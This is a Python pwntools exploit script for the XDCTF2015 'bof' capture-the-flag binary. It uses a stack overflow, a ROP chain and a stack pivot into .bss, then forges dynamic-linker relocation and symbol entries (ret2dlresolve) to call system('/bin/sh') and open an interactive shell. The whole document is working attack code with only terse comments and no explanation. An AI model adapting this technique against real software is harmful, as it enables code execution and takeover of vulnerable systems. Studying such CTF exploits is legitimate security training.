# from zio import *
from pwn import *

offset = 112

addr_plt_read  = 0x080483d0   # objdump -d -j.plt bof | grep "read"
addr_plt_write = 0x08048410   # objdump -d -j.plt bof | grep "write"

#./rp-lin-x86  --file=bof --rop=3 --unique > gadgets.txt
pppop_ret = 0x080485e3
pop_ebp_ret   =  0x080485e5
leave_ret = 0x080483a0

stack_size = 0x5a0
addr_bss   = 0x08049850   # readelf -S bof | grep ".bss"
base_stage = addr_bss + stack_size

target = "./bof"
# io   = zio((target))
io = process(target)

io.recvuntil('Welcome to XDCTF2015~!/n')
context(log_level="debug")
# io.gdb_hint([0x80484bd])
# gdb.attach(io,"b*0x80484bd\nc")
buf1  = 'A' * offset
buf1 += p32(addr_plt_read)
buf1 += p32(pppop_ret)
buf1 += p32(0)
buf1 += p32(base_stage)
buf1 += p32(100)
buf1 += p32(pop_ebp_ret)
buf1 += p32(base_stage)
buf1 += p32(leave_ret)
io.sendline(buf1)
raw_input()
cmd = "/bin/sh"
addr_plt_start = 0x80483b0 # objdump -d -j.plt bof
addr_rel_plt   = 0x804834c # objdump -s -j.rel.plt a.out
index_offset   = (base_stage + 28) - addr_rel_plt
addr_got_write = 0x8049920
r_info         = 0x607
fake_reloc     = p32(addr_got_write) + p32(r_info)
addr_dynsym    = 0x080481f4
addr_dynstr    = 0x08048294
fake_sym       = base_stage + 36
align          = 0x10 - ((fake_sym - addr_dynsym) & 0xf)
fake_sym       = fake_sym + align
index_dynsym   = (fake_sym - addr_dynsym) / 0x10
r_info         = (index_dynsym << 8 ) | 0x7
fake_reloc     = p32(addr_got_write) + p32(r_info)
st_name        = 0x5b
st_name        = (fake_sym + 16) - addr_dynstr
fake_sym       = p32(st_name) + p32(0) + p32(0) + p32(0x12)

buf2 = 'AAAA'
buf2 += p32(addr_plt_start)
buf2 += p32(index_offset)
buf2 += 'AAAA'
buf2 += p32(base_stage+80)
buf2 += p32(0)
buf2 += p32(0)
buf2 += fake_reloc
buf2 += 'B' * align
buf2 += fake_sym
buf2 += "system\x00"
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.sendline(buf2)
io.interactive()